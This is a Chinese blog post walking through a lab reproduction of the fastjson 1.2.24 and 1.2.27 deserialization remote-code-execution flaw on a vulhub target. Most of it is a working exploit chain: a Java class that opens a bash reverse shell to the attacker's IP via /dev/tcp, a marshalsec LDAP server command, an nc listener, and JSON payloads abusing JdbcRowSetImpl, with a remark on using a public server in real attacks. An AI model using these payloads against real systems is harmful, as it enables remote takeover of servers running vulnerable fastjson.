#  fastjson1.2.24 1.2.27漏洞复现   
原创 Hacker  0xh4ck3r   2025-01-28 03:00  
  
# 入职大厂必会  
  
**写在前面的话：请注意本篇博客最后面的附（注意java版本），本篇博客采用的是LDAP服务getshell，rmi同理。阅读本篇博客需了解fastjson，ldap，rmi。**  
## 启动靶场  
  
在终端里进入事先进入准备好的vulhub靶场目录下，  
```
cd fastjson/1.2.24-rce/sudo docker-compose up -d
```  
  
执行命令后，看到如下图所示即为成功，此时可在浏览器中输入http://ip:8090，正常访问即为靶场启动成功。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRDyN2wdTxhBLkYAaNuVG70SWxrRSiaMicnCU6HGbic0icsFxVibAoCmlKD4rju3O7Rqic4icy8iarZJkdkmA/640?wx_fmt=png&from=appmsg "")  
  
image-20220526192039687  
## 漏洞发现  
### 漏洞成因  
  
从 fastjson 漏洞形成的原因看，是**目标网站在解析 json 时，未对 json 内容进行验证，直接将 json 解析成 java 对象并执行**  
，这就给了攻击者可乘之机，构造对应的 payload ，让系统执行，然后达到代码执行，甚至命令执行的目的。  
### 寻找方式  
  
所以寻找存在 Fastjson 漏洞的方法，就是先找到参数中内容是 json 数据的接口，然后使用构造好的测试 payload 进行提交验证，检测原理跟 sql 注入差不多，首先找到参数提交的地方，然后再用 payload 尝试。  
  
明白寻找方式后，我们对靶场json进行测试，发现如下图所示  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRDyN2wdTxhBLkYAaNuVG70DDMdSic9XlAaxjGS6q1mAUJ2RMY4Zgvllj7lEvVlCXmF2iaMPEKqrdSw/640?wx_fmt=png&from=appmsg "")  
  
image-20220526193215832  
  
此时我们对红框中的GET改成POST，添加Content-Type字段为application/json，再添加请求参数，如下图所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRDyN2wdTxhBLkYAaNuVG70vNS1pbhpyn7I77ap6AjvZqhSYibyYsXRxIB7D94p1ObXjqofXqibxvIA/640?wx_fmt=png&from=appmsg "")  
  
image-20220526193439047  
  
可见返回来的结果被改变了，于是提交java对象试试，代码如下所示：  
```
{    "@type":"java.lang.Class",    "dataSourceName":"com.sun.rowset.JdbcRowSetImp",}   
```  
  
发现报错，说明存在fastjson漏洞。请求结果如下所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRDyN2wdTxhBLkYAaNuVG70ZYAa99K4obO7o9qIqZUCIYkOA62fE9rns7Kia2ODZcWXaRrQqqyz5bA/640?wx_fmt=png&from=appmsg "")  
  
image-20220526193910485  
## 漏洞复现  
  
此时声明一下我所使用的环境：  
  
<table><thead><tr><th valign="top" style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgb(240, 240, 240);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;"><section><span leaf="">主机</span></section></th><th valign="top" style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgb(240, 240, 240);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;"><section><span leaf="">IP</span></section></th><th valign="top" style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgb(240, 240, 240);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;"><section><span leaf="">作用</span></section></th></tr></thead><tbody><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Ubuntu22.04虚拟机</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">192.168.75.146</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">靶机</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Win10虚拟机</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">192.168.75.144</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">攻击机</span></section></td></tr></tbody></table>  
### EXP  
```
import java.lang.Runtime;import java.lang.Process;publicclass exp {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = {"/bin/bash","-c","bash -i >& /dev/tcp/192.168.75.144/1004 0>&1"};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}
```  
  
准备一个简单的EXP，写Shell配置好反弹地址和端口后，使用javac进行编译：  
```
javac C:\Users\Anonymous\Desktop\exp.java
```  
  
编译完成后，通过phpstudy开启网站服务，（**如果是打实战的话，需要用到公网服务器做服务端getshell。）**  
然后将编译后的exp.class文件移动到www目录下。  
## marshalsec开启RMI或LDAP服务  
  
攻击时还需要了解一个东西=>marshalsec，通过github可以获取到：  
  
https://github.com/mbechler/marshalsec  
  
下载成功后，需要使用maven对其进行编译，编译过程可在网上查找，此处不做过多叙述。  
  
为什么需要marshalsec呢？答案是需要通过其开启RMI服务或LDAP服务。  
  
这两个服务是干嘛的呢？答案在此，就不做多叙述。  
  
http://arsenetang.com/2022/03/20/Java%E7%AF%87%E4%B9%8BRMI&LDAP/  
  
本篇博客采用的是LDAP服务进行攻击，接下来我们在攻击机上开启服务端，通过命令开启LDAP服务：  
```
java -cp C:\Users\Anonymous\Desktop\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.75.144/#exp 1005
```  
  
**记得改IP和端口还有文件名。**  
因为采用phpstudy搭建的服务端，默认端口为80可省略不写。  
## GetShell  
  
上述准备工作做好后，新开一个终端，执行：  
```
nc -lvp 1004
```  
  
然后通过burp进行恶意请求，请求格式如下：  
  
**1.2.24:**  
```
{    "b":{        "@type":"com.sun.rowset.JdbcRowSetImpl",        "dataSourceName":"ldap://192.168.75.144:1005/exp",        "autoCommit":true    }}
```  
  
**1.2.27:**  
```
{"a":{        "@type":"java.lang.Class",        "val":"com.sun.rowset.JdbcRowSetImpl"    },    "b":{        "@type":"com.sun.rowset.JdbcRowSetImpl",        "dataSourceName":"ldap://192.168.75.144:1005/exp",        "autoCommit":true    }}
```  
  
发送请求后，我们可以看到没有返回结果，并且发送数据仍在进行中没有停下，请求过程如下图所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRDyN2wdTxhBLkYAaNuVG702HM7toXice9G2CJVXFC2M5iaxhpOuBbMYxdRuC4rRpPZug1E81PT7LnA/640?wx_fmt=png&from=appmsg "")  
  
image-20220526195801178  
  
此时我们在反弹shell的终端里输入ls，可看到如下图所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRDyN2wdTxhBLkYAaNuVG70M2m5PdPO4Dtdh6nY0qYSXWKNQlAjgwC1DJHDj0Ar8WnbqMkJkmQSXA/640?wx_fmt=png&from=appmsg "")  
  
image-20220526195912644  
  
可以看到成功拿到shell，至此，复现FastJson1.2.24及以下版本的漏洞利用到此结束。  
  
附（RMI和LDAP对java的版本要求如下，**本篇博客采用的java版本是8u181**  
）：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRDyN2wdTxhBLkYAaNuVG70ZKDhhE0OdnP1lMCic9bt0R5ZXVbRdqa2F8UU7QGKgfNcib3vyha5W4xQ/640?wx_fmt=png&from=appmsg "")  
  
image-20220526200119708  
  
  
